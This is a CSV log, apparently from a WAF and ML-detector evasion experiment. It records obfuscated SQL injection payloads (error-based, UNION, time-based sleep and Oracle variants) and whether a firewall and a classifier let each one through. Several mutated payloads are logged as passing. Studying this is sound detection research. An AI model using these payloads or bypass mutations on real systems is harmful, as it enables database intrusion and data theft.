Timestamp,Payload,WAF_Prediction_Timestamp,WAF_Prediction,ML_Prediction_Timestamp,ML_Prediction
2024-09-04T10:32:23.188808,"1"""" or (SelECt
(SELeCT  Or (SELECT 1))/**/From(selEct count(*),concat(0x7171706a71,(SeLEct (elt(0x23d5 LiKE 0x23d5,'T' NOT LIKE 'T}'))),0x717a767a71,floor(rand((SELeCt/**/(selECt 1074=1074 lIke 5232)))* Or 'H'<>'Hy'))x FroM information_schema.character_sets group by
x)a) aNd """"bkrk"""" LIKe """"bkrk",2024-09-04T10:32:23.202385,403,2024-09-04T10:32:35.473853,Rejected
2024-09-04T10:32:36.499034,"(SELECT 5142 IN (5141,5142,5143))"""" OR (SeLeCT
(seLecT  Or (SEleCt
1))/**/FRom(sEleCT count(*),concat(0x7171706a71,(SEleCT (elt(0x23d5 lIkE 0x23d5,'T' not like 'T}'))),0x717a767a71,floor(rand((sELecT (SELEct 1074=0x432 LIKe 5232)))* oR 'H'<>'Hy'))x fRoM information_schema.character_sets group by
x)a) And """"bkrk"""" LiKE """"bkrk",2024-09-04T10:32:36.505189,403,2024-09-04T10:32:49.477251,Rejected
2024-09-04T10:32:50.516276,"(SeLect 6891 LiKE 6891 iN (5141,5142,5143))"""" Or (SELECT
(SElECT  Or (SeLECT
1)) FROm(SeLEcT count(*),concat(0x7171706a71,(SeLEct (elt(0x23d5 like 0x23d5,'T' not like 'T}'))),0x717a767a71,floor(rand((sEleCt (seleCT  and 1=0x432 liKE (selEcT 5232))))* OR 'H' not
like 'Hy'))x frOM information_schema.character_sets group by
x)a) aNd """"bkrk"""" LiKe """"bkrk",2024-09-04T10:32:50.521681,403,2024-09-04T10:33:04.989939,Rejected
2024-09-04T10:33:06.022423,"(sELEct ' Z'!=' Z_' LiKe 6891 iN (5141,(SELECT 5142),5143))"""" OR (sELect
(SELect  OR (SElECt
 OR 0)) fRoM(sElECt count(*),concat(0x7171706a71,(SEleCt (elt(0x23d5 LiKe 0x23d5,'T' not like/**/'T}'))),0x717a767a71,floor(rand((seLecT (Select  AnD 1 LiKe 0x432 liKe (seLEcT 5232))))* Or 'H' not
like 'Hy'))x FrOm information_schema.character_sets group by	x)a) and """"bkrk"""" LikE """"bkrk",2024-09-04T10:33:06.027722,403,2024-09-04T10:33:21.715966,Rejected
2024-09-04T10:33:22.739084,"(seLEcT ' Z'!=' Z_' like 6891 In (5141,(SeLecT 0x1416),5143))"""" or (SeLeCt
(SELEcT  || (SELeCT  OR  And 1)) FrOM(sElect count(*),concat(0x7171706a71,(SelecT (elt(0x23d5 lIKE 0x23d5,'T' not like 'T}'))),0x717a767a71,floor(rand((SeLecT (SeLECt  AnD 1 liKe 0x432 LiKe (sElECt 1078=1078))))* Or 'H' not
like 'Hy'))x FROm information_schema.character_sets group by	x)a) anD """"bkrk"""" LiKe """"bkrk",2024-09-04T10:33:22.743056,403,2024-09-04T10:33:39.640717,Rejected
2024-09-04T10:33:40.676187,"(seLeCt ' Z'!=' Z_' lIKE  oR 0 IN (5141,(sEleCT 0x1416),(selECT 5143)))"""" Or (selEcT	(SELeCt  || (SEleCt  ||  anD 1)) fRom(sEleCT count(*),concat(0x7171706a71,(seLECt (elt(0x23d5 LIKE/**/0x23d5,'T' not like 'T}'))),0x717a767a71,floor(rand((SElect (SELecT  ANd 1 lIKE 0x432 lIKe (seLeCt 1078='""' LikE '""'))))* or 'H' not
like 'Hy'))x FroM information_schema.character_sets group by	x)a) anD """"bkrk"""" LiKe """"bkrk",2024-09-04T10:33:40.680315,403,2024-09-04T10:33:57.372856,Rejected
2024-09-04T10:33:58.401742,"(SElEct ' Z' NOT LIKE ' Z_' lIke  or 9026 LIKE 9026 in (5141,(sELEct 0x1416),(seLeCt 5143)))"""" or (seleCt	(SeLecT  || (SELEct  ||  aND 1)) FrOM(SEleCT count(*),concat(0x7171706a71,(SelecT (elt(0x23d5 LIke/**/0x23d5,'T' not like 'T}'))),0x717a767a71,floor(rand((SeLecT (sELect  anD/**/1 liKe 0x432 LIke (SeLect  And 0x1='""' like '""'))))* or 'H' not	like 'Hy'))x FroM information_schema.character_sets group by	x)a) aND """"bkrk"""" LIKe """"bkrk",2024-09-04T10:33:58.407153,403,2024-09-04T10:34:16.160991,Rejected
2024-09-04T10:34:17.178275,"1'))) union all select null,null#",2024-09-04T10:34:17.183413,403,2024-09-04T10:34:18.610770,Rejected
2024-09-04T10:34:18.619849,"Or ']Bp' like
']Bp''))) union all sEleCT/*>*)&U*/null,null#",2024-09-04T10:34:18.623626,403,2024-09-04T10:34:21.476473,Rejected
2024-09-04T10:34:22.489028,"/*|*/or ']Bp' lIKE
']Bp''))) union all	SEleCt/*>*)&U*/null,null#",2024-09-04T10:34:22.492749,403,2024-09-04T10:34:25.150127,Rejected
2024-09-04T10:34:26.171990,"/*|*/Or	']Bp' liKE
']Bp'')))/**/union all	SEleCT/*>*)&U*/null,null#",2024-09-04T10:34:26.177933,403,2024-09-04T10:34:29.054929,Accepted
2024-09-04T10:34:30.066480,"/*|*/or	']Bp'/**/lIkE	']Bp'')))/**/union all	sELECT/*>*)&U*/null,null#S:",2024-09-04T10:34:30.069694,403,2024-09-04T10:34:33.088179,Accepted
2024-09-04T10:34:34.105346,"/*|*/oR	']Bp'/*{)VP*/lIKE	']Bp''))) union
all	sElECT/*>*)&U*/null,null#S:",2024-09-04T10:34:34.118443,403,2024-09-04T10:34:37.276942,Accepted
2024-09-04T10:34:38.295737,"/*|*/oR	']Bp'/*{)VP*/lIke
']Bp'')))/**/union
all	seLeCT/*>*)&U*/null,null#S:F`",2024-09-04T10:34:38.301090,403,2024-09-04T10:34:41.505485,Accepted
2024-09-04T10:34:42.524867,"/*|*/OR	']Bp'/*{)VP*/LikE	']Bp'')))/*Pr?*/union
all	SeLect/*>*)&U*/null,null#S:F`",2024-09-04T10:34:42.538832,403,2024-09-04T10:34:46.143166,Accepted
2024-09-04T10:34:47.166746,"/*|*/||	']Bp'/*{)VP*/like	']Bp'')))	union
all	sEleCT/*>*)&U*/null,null#S:F`l%",2024-09-04T10:34:47.170610,403,2024-09-04T10:34:50.513939,Accepted
2024-09-04T10:34:51.528851,"/*|*//**/or 
']Bp'/*{)VP*/LIke	']Bp'')))	union
all	selEcT/*>*)&U*/null,null#S:F`l%",2024-09-04T10:34:51.532341,403,2024-09-04T10:34:54.886868,Accepted
2024-09-04T10:34:55.907521,"/*|*/ Or 
']Bp'/*{)VP*/LIKe	']Bp'')))	union all	SeleCt/*>*)&U*/null,null#S:F`l%)",2024-09-04T10:34:55.911721,403,2024-09-04T10:34:59.577103,Accepted
2024-09-04T10:35:00.591985,"1"""")) as ljhz where 2416=2416;begin dbms_lock.sleep(5); end--",2024-09-04T10:35:00.608248,403,2024-09-04T10:35:03.495187,Rejected
2024-09-04T10:35:03.508123,"1"""")) as ljhz WHErE	(SELECT 1298) like  AnD 1 LIKE 2416;begin/**/dbms_lock.sleep(5); End--",2024-09-04T10:35:03.512206,403,2024-09-04T10:35:08.005096,Rejected
2024-09-04T10:35:09.026666,"0x1"""")) As ljhz whERE	(sElEct  oR 0) Like  aNd 1 liKE 2416;begin/**/dbms_lock.sleep(1775 In/**/(1774,1775,1776));	end--",2024-09-04T10:35:09.032546,200,2024-09-04T10:35:14.895643,Accepted
2024-09-04T10:35:15.917288,"0x1"""")) as ljhz wHEre	(SElEct  Or (sELECt 0)) like  aNd 1 LiKe 2416;begin/**/dbms_lock.sleep(1775 IN/**/('e`P' not like/**/'e`Pp', OR 0,1776));
end--",2024-09-04T10:35:15.925972,200,2024-09-04T10:35:22.816411,Accepted
2024-09-04T10:35:23.846866,"0x1"""")) AS ljhz WHerE
(sELeCT  Or (SELeCt 0)) LIke  And 1 likE 6857=6857;begin/**/dbms_lock.sleep((sElECT 1) iN ('e`P' not like/**/'e`Pp', or 0,0x6f0));
eNd--",2024-09-04T10:35:23.850911,403,2024-09-04T10:35:30.305044,Rejected
2024-09-04T10:35:31.327737,"0x1"""")) as ljhz WHEre (SELEcT  Or (sELeCT 0)) lIkE  aNd 1 lIkE 4041!=4042 LIke 0x1ac9;begin/**/dbms_lock.sleep((sELeCt 1) iN ('e`P' not like 'e`Pp', or  OR 0,0x6f0));
ENd--",2024-09-04T10:35:31.332144,200,2024-09-04T10:35:38.821291,Rejected
2024-09-04T10:35:39.844883,"0x1"""")) AS ljhz wHerE (SELECt  Or (SelecT 0)) lIkE  And (SELecT  OR 0) lIke '	' LIKE '	' NOT LIKE 4042 LIkE 0x1ac9;begin dbms_lock.sleep((seleCT 1) IN ('e`P' not like 'e`Pp', OR  or 0,0x6f0));	end--",2024-09-04T10:35:39.850122,200,2024-09-04T10:35:47.766632,Rejected
2024-09-04T10:35:48.789885,"0x1"""")) AS ljhz WHErE (seLECt  Or (seLECT 0)) LIkE  AND (SELECt  OR 	OR (sELECT 0)) lIKE '	' liKE '	' NOT LIKE 'AF' LIke 'AF' like 0x1ac9;begin dbms_lock.sleep((seLeCT 1) iN ('e`P' not like 'e`Pp',/**/Or  OR 0,0x6f0));	eNd--",2024-09-04T10:35:48.795222,200,2024-09-04T10:35:58.229502,Rejected
2024-09-04T10:35:59.261159,"0x1"""")) as ljhz wHeRE (sElECT  oR (Select
(SELecT 1))) lIKe  ANd (SelECt  oR 	OR (SelEcT 0)) Like '	' likE '	' not like 'AF' LIKe 'AF' LIkE 0x1ac9;begin dbms_lock.sleep((selEcT 1) iN ('e`P' not like 'e`Pp', Or  or '0x1>)' LiKe '1>)',0x6f0));	EnD--",2024-09-04T10:35:59.276032,403,2024-09-04T10:36:09.511871,Accepted
2024-09-04T10:36:10.537986,"0x1"""")) AS ljhz whEre (sELecT  or (SeLECt
(SElECT ']'=']')))/*4*/lIke  And (SElect  oR 	oR (sElect  OR 0)) like '	' Like ' ' not like 'AF' lIKE 'AF' lIke 0x1ac9;begin dbms_lock.sleep((SelecT 0x1) iN ('e`P' not like 'e`Pp', or  oR '0x1>)' LikE '1>)',0x6f0));	EnD--",2024-09-04T10:36:10.542821,403,2024-09-04T10:36:21.621962,Rejected
2024-09-04T10:36:22.658120,"0x1"""")) AS ljhz wHErE (sElEcT  Or (SELeCt
(sELECT ']'=']')))/**/lIkE  AND (sElecT  or 	OR (SElEct  Or 'O'<>'OL')) lIKE '	' likE ' ' not like 'AF' LIKe/**/'AF' LIKE 0x1ac9;begin dbms_lock.sleep((SEleCt 0x1) in ('e`P' not like 'e`Pp', oR  oR '0x1>)' like '(SELECT (SELECT 1))>)',0x6f0));
EnD--",2024-09-04T10:36:22.662124,403,2024-09-04T10:36:34.443820,Rejected
2024-09-04T10:36:35.452374,-3613%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',2024-09-04T10:36:35.456538,403,2024-09-04T10:36:46.274071,Rejected
2024-09-04T10:36:46.282452,-'VH'<>'VH3'%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1/**/else 0 end) from	dual)||chr(113)||chr(122)||chr(118)||chr( OR 0)||chr(0x71)||chr(62))) from dual) and ('%'=',2024-09-04T10:36:46.286666,403,2024-09-04T10:36:56.907639,Rejected
2024-09-04T10:36:57.923061,-'VH'!='VH3'%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr((SELECT 113))||chr(112)||chr(106)||chr(113)||(select (case when (1283 LIKE 1283=4144) then 1 else 0 end) from dual)||chr(113)||chr( AND 1)||chr(118)||chr( OR 0)||chr(0x71)||chr(62))) from dual) and ('%'=',2024-09-04T10:36:57.932118,403,2024-09-04T10:37:09.718515,Rejected
2024-09-04T10:37:10.729489,-'VH' not like 'VH3'%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr((SELECT 113))||chr(112)||chr(106)||chr('w' LIKE 'w')||(select (case when ( OR 0 LIKE 1283=4144) then 1 else 0 end) from	dual)||chr(113)||chr( AND 1)||chr(0x76)||chr( OR 0)||chr(0x71)||chr(62))) from/*t17YA*/dual) and ('%'=',2024-09-04T10:37:10.734742,403,2024-09-04T10:37:23.558284,Rejected
2024-09-04T10:37:24.576008,"-'VH' not like 'VH3'%') or 4144=(select upper(xmltype(chr(60)||chr(0x3a)||chr(113)||chr((SELECT  OR 0))||chr(112)||chr(106)||chr('w' LIKE 'w')||(select (case/**/when ( OR 0 LIKE 'L'='L'=4144) then 1 else 0 end) from	dual)||chr(113)||chr( AND 1)||chr(0x76)||chr( OR 0)||chr(0x71)||chr(62))) from/*_/
*/dual) and ('%'='",2024-09-04T10:37:24.594691,403,2024-09-04T10:37:38.256510,Rejected
2024-09-04T10:37:39.270974,"-'VH' not like 'VH3'%') or 4144=(select upper(xmltype(chr(60)||chr(0x3a)||chr(113)||chr((SELECT  OR 0))||chr(112)||chr( AND 1)||chr('w' LIKE 'w')||(select (case when ( OR 0 LIKE 'L'='L'=4144) then ')P' LIKE ')P' else 0 end) from dual)||chr((SELECT 113))||chr( AND 1)||chr(0x76)||chr( OR 0)||chr(0x71)||chr(62))) from/*_/
*/dual) and ('%'='",2024-09-04T10:37:39.289738,403,2024-09-04T10:37:53.441669,Rejected
2024-09-04T10:37:54.462268,-'VH' not like 'VH3'%') or 4144=(select upper(xmltype(chr(60)||chr(0x3a)||chr( OR 0)||chr((SELECT  OR 0))||chr(':'!=':>')||chr( AND 1)||chr('w' LIKE 'w')||(select (case when ( OR 0 LIKE 'L'='L'=4144) then ')P' LIKE ')P' else 0 end) from dual)||chr((SELECT 113))||chr( AND 0x1)||chr(0x76)||chr( OR 0)||chr(0x71)||chr(62)))/**/from/*_/	*/dual) and ('%'=',2024-09-04T10:37:54.497502,403,2024-09-04T10:38:09.052677,Rejected
2024-09-04T10:38:10.070667,"-'VH' not like 'VH3'%') or 4144=(select upper(xmltype(chr(60)||chr(0x3a)||chr( OR 0)||chr((SELECT  OR 0))||chr(':'!=':>')||chr( AND 1)||chr('w' LIKE 'w')||(select (case when ( OR 0 LIKE 'L'='L'=4144) then ')P' LIKE ')P' else (SELECT 1) end) from dual)||chr((SELECT 'A' LIKE 'A'))||chr( AND 0x1)||chr(0x76)||chr( OR 0)||chr(0x71)||chr(0x3e))) from/*_/
*/dual) and ('%'='",2024-09-04T10:38:10.085321,403,2024-09-04T10:38:25.350243,Rejected
2024-09-04T10:38:26.376366,-'VH' not like 'VH3'%') or 4144=(select upper(xmltype(chr(60)||chr(0x3a)||chr( OR 0)||chr((SELECT  OR 0x0))||chr(':'!=':>')||chr( AND 1)||chr('w' LIKE 'w')||(select (case when ( OR 0 LIKE 'L'='L'=4144) then ')P' LIKE ')P' else (SELECT  AND 1<>2687) end) from dual)||chr((SELECT 'A' LIKE 'A'))||chr( AND/**/0x1)||chr(0x76)||chr( OR 0)||chr(0x71)||chr(0x3e))) from/*_/ */dual) and ('%'=',2024-09-04T10:38:26.382119,403,2024-09-04T10:38:42.701958,Rejected
2024-09-04T10:38:43.732872,-'VH' not	like 'VH3'%') or 4144=(select upper(xmltype(chr((SELECT 60))||chr(0x3a)||chr( OR 0)||chr((SELECT  OR 0x0))||chr(':'!=':>')||chr( AND 1)||chr('w' LIKE 'w')||(select (case when ( OR  AND 1 LIKE 'L'='L'=4144) then ')P' LIKE ')P' else (SELECT  AND 1<>'&'='&') end) from dual)||chr((SELECT 'A' LIKE 'A'))||chr( AND 0x1)||chr(0x76)||chr( OR 0)||chr(0x71)||chr(0x3e))) from/*_/ */dual) and ('%'=',2024-09-04T10:38:43.749058,403,2024-09-04T10:39:00.383844,Rejected
2024-09-04T10:39:01.398850,-'VH' not like 'VH3'%') or 4144=(select upper(xmltype(chr((SELECT  OR 0))||chr(0x3a)||chr( OR 0)||chr((SELECT  OR 0x0))||chr(':'!=':>')||chr( AND 0x1)||chr('w' LIKE 'w')||(select (case when ( OR  AND 1 LIKE 'L'='L'=4144) then ')P' LIKE ')P' else (SELECT  AND 980<>981<>'&'='&') end) from/**/dual)||chr((SELECT 'A' LIKE 'A'))||chr( AND 0x1)||chr(0x76)||chr( OR 0)||chr(0x71)||chr(0x3e))) from/*_/ */dual) and ('%'=',2024-09-04T10:39:01.404850,403,2024-09-04T10:39:18.763837,Rejected
2024-09-04T10:39:19.769505,"travesia palacio 61, 1?d",2024-09-04T10:39:19.776695,200,2024-09-04T10:39:20.862581,Accepted
2024-09-04T10:39:20.871248,"travesia/*^\7077=7077*/palacio  or 0x0,
1?d",2024-09-04T10:39:20.875799,200,2024-09-04T10:39:22.742529,Rejected
2024-09-04T10:39:23.754716,"travesia/**/palacio /**/Or	0x0,
(SELECT 1)?d",2024-09-04T10:39:23.759515,403,2024-09-04T10:39:25.625539,Accepted
2024-09-04T10:39:26.640884,"travesia/**/palacio/**//**/or	0x0,
(sELect
(SELECT  OR 'U,2O:'<>'U,2O:3'))?d",2024-09-04T10:39:26.646355,403,2024-09-04T10:39:29.792015,Accepted
2024-09-04T10:39:30.816943,"travesia palacio/**//**/OR
0x0,
(selECt
(seLECt  || 'U,2O:'<>'U,2O:(SELECT 0x1)'))?d",2024-09-04T10:39:30.821048,403,2024-09-04T10:39:34.361429,Rejected
2024-09-04T10:39:35.386358,"travesia palacio /**/Or
0x0,
(SElEcT
(sElect  
or  'U,2O:'<>'U,2O:(SELECT 0x1)'))?d",2024-09-04T10:39:35.399399,403,2024-09-04T10:39:39.554610,Rejected
2024-09-04T10:39:40.566124,"travesia palacio /*d?e!	*/or
0x0,
(sElect
(sElEcT  
or  'U,2O:'
not like/**/'U,2O:(SELECT 0x1)'))?d",2024-09-04T10:39:40.579762,403,2024-09-04T10:39:45.036336,Accepted
2024-09-04T10:39:46.056511,"travesia palacio /*d?e! */or
0x0,
(seLECt
(sElEcT  
or  'U,2O:'
not like 'U,2O:(SELECT 0x1)'))?d",2024-09-04T10:39:46.062603,403,2024-09-04T10:39:50.138195,Rejected
2024-09-04T10:39:51.161197,"travesia palacio /*d?e! */Or
0x0,
(sElECT
(SeleCT/*YA[*/ 
Or
 'U,2O:'
not like 'U,2O:(SELECT 0x1)'))?d",2024-09-04T10:39:51.166702,403,2024-09-04T10:39:55.402790,Accepted
2024-09-04T10:39:56.420357,"travesia palacio	/**/oR
0x0,
(sELECT
(seLEct/*YA[*/ 
oR
 'U,2O:'
not like 'U,2O:(SELECT/**/0x1)'))?d",2024-09-04T10:39:56.434817,403,2024-09-04T10:40:00.787576,Accepted
2024-09-04T10:40:01.805927,"travesia/**/palacio	/**/or
0x0,
(SeLECT
(sEleCt/*YA[*/ 
||  'U,2O:'
not like 'U,2O:(SELECT/**/0x1)'))?d",2024-09-04T10:40:01.809969,403,2024-09-04T10:40:06.508179,Rejected
2024-09-04T10:40:07.523152,1' where 9416=9416;begin user_lock.sleep(5); end--,2024-09-04T10:40:07.528610,403,2024-09-04T10:40:09.681804,Rejected
2024-09-04T10:40:09.692331,"1' WherE 5144<> AnD/**/1 LIKE 0x24c8;begin user_lock.sleep(5);
EnD--",2024-09-04T10:40:09.696517,403,2024-09-04T10:40:12.533199,Rejected
2024-09-04T10:40:13.544966,"'xsit9' lIkE 'xsit9'' WHERe	5144 not like  AnD/**/1 liKE 0x24c8;begin/**/user_lock.sleep((Select  OR 0));
eNd--",2024-09-04T10:40:13.549912,200,2024-09-04T10:40:18.199182,Accepted
2024-09-04T10:40:19.235668,'xsit9' lIKe 'xsit9'' WhEre	6739 LIKE 6739 not like  ANd/*BCa*/1 lIKE 0x24c8;begin user_lock.sleep((seleCT  ||  Or 0x0)); eND--,2024-09-04T10:40:19.243474,200,2024-09-04T10:40:24.870615,Rejected
2024-09-04T10:40:25.890468,"'xsit9' lIKE 'xsit9'' wHERe	6739 lIkE 9920 IN ( AND 1,9920,9921) not like  aNd/*BCa*/0x1 Like/**/0x24c8;begin user_lock.sleep((sELecT 	||  or 0x0)); eND--",2024-09-04T10:40:25.907519,200,2024-09-04T10:40:32.844185,Rejected
2024-09-04T10:40:33.906750,"'xsit9' lIKe 'xsit9'' WHere	 OR 0 like 9920 IN ( ANd 3154 NOT LIKE 3155,9920,0x26c1) not like  aND/**/0x1 lIkE/*P&L*/0x24c8;begin user_lock.sleep((seLeCT 	||
/**/or 0x0)); eND--",2024-09-04T10:40:33.921712,200,2024-09-04T10:40:41.223817,Rejected
2024-09-04T10:40:42.249378,"'xsit9' LIkE 'xsit9'' whErE	 or 0 LIKE (SELECT 1)/**/iN ( ANd 3154 NOT LIKE (SELECT '4'!='4`'),9920,0x26c1) not like  aNd/**/0x1 lIke/**/0x24c8;begin user_lock.sleep((sELEct
	 OR 
/*m*/OR 0x0)); end--",2024-09-04T10:40:42.262281,403,2024-09-04T10:40:50.901638,Rejected
2024-09-04T10:40:51.927278,"'xsit9' Like 'xsit9'' whErE	 or 0 LIKE (SELECT 8564 NOT LIKE 8565)/**/iN ( ANd (SELECT 1) NOT LIKE (SELECT '4'!='4`'),0x26c0,0x26c1) not like  and/**/0x1 lIKe/**/0x24c8;begin user_lock.sleep((SeleCt
  or 
/**/or 0x0));/**/END--",2024-09-04T10:40:51.932099,403,2024-09-04T10:41:01.289429,Rejected
2024-09-04T10:41:02.307484,"'xsit9' LIKe 'xsit9'' whErE
 or 0x0 LIKE (SELECT 8564 NOT LIKE 8565)/**/iN ( ANd (SELECT  AND 1) NOT LIKE (SELECT ''F' NOT LIKE 'F<''!='4`'),0x26c0,0x26c1) not like  and/**/0x1 lIKe 0x24c8;begin user_lock.sleep((sELECT
  or 
/*q1*/oR 0x0));/**/End--",2024-09-04T10:41:02.316925,200,2024-09-04T10:41:14.208428,Rejected
2024-09-04T10:41:15.230905,"'xsit9' LikE 'xsit9'' whErE
 or 0x0 LIKE (SELECT (SELECT 8564) NOT LIKE (SELECT 1))/**/iN ( ANd (SELECT  AND 4751=4751) NOT LIKE (SELECT ''F' not like 'F<''!='4`'),0x26c0,0x26c1) not like  AND/**/0x1 LikE 0x24c8;begin user_lock.sleep((SelECt
  OR  /**/or 0x0)); ENd--",2024-09-04T10:41:15.237054,200,2024-09-04T10:41:27.053472,Rejected
2024-09-04T10:41:28.082789,"'xsit9' lIKE 'xsit9'' whErE
 or 0x0 LIKE (SELECT (SELECT  OR 0) NOT LIKE (SELECT 1940 LIKE 1940))/**/iN ( ANd (SELECT  AND 4751=4751) NOT LIKE (SELECT ''F' not like 'F<''!='(SELECT 4)`'),0x26c0,0x26c1) not like  AnD/**/0x1 lIKe 0x24c8;begin user_lock.sleep((selECt	  Or   or 0x0)); eND--",2024-09-04T10:41:28.098084,200,2024-09-04T10:41:40.681492,Rejected
2024-09-04T10:41:41.694457,1)) as emtf where 3561=3561 or (select * from (select(sleep(5)))ydpu)--,2024-09-04T10:41:41.699613,403,2024-09-04T10:41:44.683370,Rejected
2024-09-04T10:41:44.693678,1)) As emtf/**/WHere 0x1d1e not like 7455= oR 0 oR (SElEct *	froM (SElEcT(sleep(5)))ydpu)--,2024-09-04T10:41:44.696905,403,2024-09-04T10:41:48.578222,Rejected
2024-09-04T10:41:49.600401,"4796!=4797)) aS emtf WhERE 0x1d1e not like (SELeCT  aNd 1) likE  OR 0 OR (select *
FrOm (SelEct(sleep(5)))ydpu)--",2024-09-04T10:41:49.606744,403,2024-09-04T10:41:54.232458,Rejected
2024-09-04T10:41:55.260095,4796!=(select 1))) as emtf WHeRE 0x1d1e not like (seleCt  aND 1) lIKe  or/**/9444 NOT LIKE 9445 oR (sELect * frOm (SelECt(sleep(0x5)))ydpu)--,2024-09-04T10:41:55.266752,403,2024-09-04T10:42:01.498444,Rejected
2024-09-04T10:42:02.524855,4796!=(SElECT (SeleCT 1)))) aS emtf wheRe 0x1d1e not like (sELecT  AnD 9475<>9476)	Like  or 9444 NOT LIKE  || 0 OR (selECT * FRoM (selECt(sleep(0x5)))ydpu)--,2024-09-04T10:42:02.544384,403,2024-09-04T10:42:09.302868,Rejected
2024-09-04T10:42:10.333238,4796!=(seLEcT (sELecT 'k0}h'!='k0}h1')))) As emtf Where 0x1d1e not like (SELect  aNd/**/9475!=9476)	lIKe  Or (SELECT 1) NOT LIKE  || (SELECT 0) or (sElEct	* fRoM (sElEct(sleep(0x5)))ydpu)--,2024-09-04T10:42:10.338835,403,2024-09-04T10:42:18.200557,Rejected
2024-09-04T10:42:19.230719,"4796 not like (SElEcT (SELECT 'k0}h'!='k0}h'RR' NOT LIKE 'RR""'')))) as emtf WHerE 0x1d1e not like (SElEct  aNd  AND 1!=9476)
lIkE  Or (SElect 0x1) NOT LIKE  || (SEleCt 0) oR (SELeCT	* FROM (sElect(sleep(0x5)))ydpu)--",2024-09-04T10:42:19.247901,403,2024-09-04T10:42:31.279850,Rejected
2024-09-04T10:42:32.310699,"'rJ1'='rJ1' not like (SeleCT (SELEcT 'k0}h'!='k0}h'RR' NOT LIKE 'RR""'')))) aS emtf WHERe 0x1d1e not like (sElECT  AnD  aND 1!=(selEcT (SelEct 1))) likE  oR (sElEcT 0x1) NOT LIKE /*s'gF~*/ or  (seleCt 0) oR (SelEcT	* FROm (SeLEcT(sleep(0x5)))ydpu)--",2024-09-04T10:42:32.315357,403,2024-09-04T10:42:42.541145,Rejected
2024-09-04T10:42:43.583856,"'rJ1'='rJ1' not like (SElECt (SeLect 'k0}h'<>'k0}h'RR' NOT LIKE 'RR""'')))) AS emtf wHERE 0x1d1e not like (SElecT  ANd  aNd (SELECT 1)!=(SEleCt (Select '{Ye' LIKE '{Ye'))) likE  Or (sELect 0x1) NOT LIKE /*f*//**/or  (sELect  OR 0) OR (sELECT	* From
(sELECt(sleep(0x5)))ydpu)--",2024-09-04T10:42:43.588925,403,2024-09-04T10:42:56.844104,Rejected
2024-09-04T10:42:57.874326,"'rJ1'='rJ1' not like (SElECT (SelEct 'k0}h'<>'k0}h'RR' NOT LIKE 'RR""'')))) AS emtf WHEre 0x1d1e not like (SElecT  And  AnD (SelEct  AND 1)!=(SELEct (sElEcT '{Ye' lIKe '{Ye'))) lIkE  OR (SELect 0x1) NOT LIKE /**/ oR  (SElect  or (SELECT 3273 NOT LIKE 3274)) Or (SELEct * fROm
(seLecT(sleep(0x5)))ydpu)--",2024-09-04T10:42:57.879278,403,2024-09-04T10:43:10.148467,Rejected
2024-09-04T10:43:11.186999,"'rJ1'='rJ1' not like (SEleCT (SELecT 'k0}h'<>'k0}h'RR' NOT LIKE 'RR""'')))) as emtf whERe 0x1d1e not like (seLEcT  AnD  and (SElECt  ANd 0x1)!=(SElecT (SElect '{Ye' LikE '{Ye'))) lIkE  or (SELEcT 0x1) not like   oR  (SeleCT 
or (seLEct 3273 NOT LIKE  oR 'h%' liKe 'h%')) OR (sELEcT * froM
(SelECt(sleep(0x5)))ydpu)--",2024-09-04T10:43:11.191594,403,2024-09-04T10:43:24.795058,Rejected
2024-09-04T10:43:25.808579,camino el pino,2024-09-04T10:43:25.816150,200,2024-09-04T10:43:26.588994,Accepted
2024-09-04T10:43:26.597354,"camino
el/*3""xGX*/pino",2024-09-04T10:43:26.601888,200,2024-09-04T10:43:27.754211,Accepted
2024-09-04T10:43:28.763860,camino el/**/pino,2024-09-04T10:43:28.767883,200,2024-09-04T10:43:29.528874,Accepted
2024-09-04T10:43:30.541815,camino	el pino,2024-09-04T10:43:30.548505,200,2024-09-04T10:43:31.250465,Rejected
2024-09-04T10:43:32.265176,"camino
el/**/pino",2024-09-04T10:43:32.273788,200,2024-09-04T10:43:33.047743,Accepted
2024-09-04T10:43:34.058098,"camino
el	pino",2024-09-04T10:43:34.063183,200,2024-09-04T10:43:34.712189,Accepted
